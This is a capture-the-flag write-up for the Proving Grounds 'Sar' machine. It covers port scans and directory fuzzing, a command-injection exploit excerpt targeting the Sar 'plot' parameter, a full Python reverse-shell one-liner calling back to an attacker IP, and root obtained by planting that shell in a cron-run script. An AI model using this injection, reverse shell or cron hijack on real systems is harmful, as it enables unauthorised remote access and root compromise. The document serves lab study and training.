---
title: "PG Play: Sar"
created: "2023-07-23"
updated: "2026-04-11"
type: ctf-writeup
platform: Proving Grounds Play
machine: "Sar"
os: Linux
status: rooted
tags:
  - - proving-grounds
  - pg-play
  - linux
  - ctf
  - oscp
  - cron-job-abuse
  - reverse-shell
  - searchsploit--exploit-db
related:
  - "[[Linux-PrivEsc-Decision-Tree]]"
  - "[[Reverse-Shell-Reference]]"
  - "[[Searchsploit-and-CVE-Workflow]]"
  - "[[Nmap-Enumeration-Methodology]]"
---

# PG Play: Sar

> **Platform:** Proving Grounds Play | **OS:** Linux | **Date:** 2023-07-23

---

## Quick Summary

**Open Ports:**
- 22/tcp (ssh)
- 80/tcp (http)

**Key Techniques:**
- Cron Job Abuse
- Reverse Shell
- Searchsploit / Exploit-DB

**Privilege Escalation Path:**
- Cron job abuse
- Kernel exploit

---

## Full Walkthrough

Proving grounds Play - Sar CTF writeup.

## NMAP
```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3340be13cf517dd6a59c64c813e5f29f (RSA)
|   256 8a4eab0bdee3694050989858328f719e (ECDSA)
|_  256 e62f551cdbd0bb469280dd5f8ea30a41 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Fuzzing for Directories and Files

```sh
000000069:   200        375 L    964 W      10918 Ch    "index.html"                           
000000157:   403        9 L      28 W       279 Ch      ".htaccess"                            
000000248:   200        1 L      1 W        9 Ch        "robots.txt"                           
000000279:   200        1172 L   5873 W     95674 Ch    "phpinfo.php"
```

**Sar v3.21**


## Searchsploit


## Remote Code Execution

As per the exploit code the param `plot` is vulnerable to remote code execution.

```py
def exploiter(cmd):
    global url
    sess = requests.session()
    output = sess.get(f"{url}/index.php?plot=;{cmd}")       #vulnerable
    try:
        out = re.findall("<option value=(.*?)>", output.text)
    except:
        print ("Error!!")
    for ouut in out:
        if "There is no defined host..." not in ouut:
            if "null selected" not in ouut:
                if "selected" not in ouut:
                    print (ouut)
    print ()
```

**Python Reverse Shell**

```sh
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.151",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

## Reverse Shell Obtained


## Privilege Escalation

Crontab running a cron job every 5 minutes.


Listing permissions for the script file.


### Script contents

**Finally.sh**

```sh
#!/bin/sh

./write.sh
```

**write.sh**

```sh
#!/bin/sh

touch /tmp/gateway
```

Added python revershell to the `write.sh` file, so when the cronjob runs the write.sh file it will runs as `root`.


## Root Obtained

---

## Technique Links

- [[Linux-PrivEsc-Decision-Tree]]
- [[Reverse-Shell-Reference]]
- [[Searchsploit-and-CVE-Workflow]]
- [[Nmap-Enumeration-Methodology]]
- [[Proving-Grounds-Master-Index]]
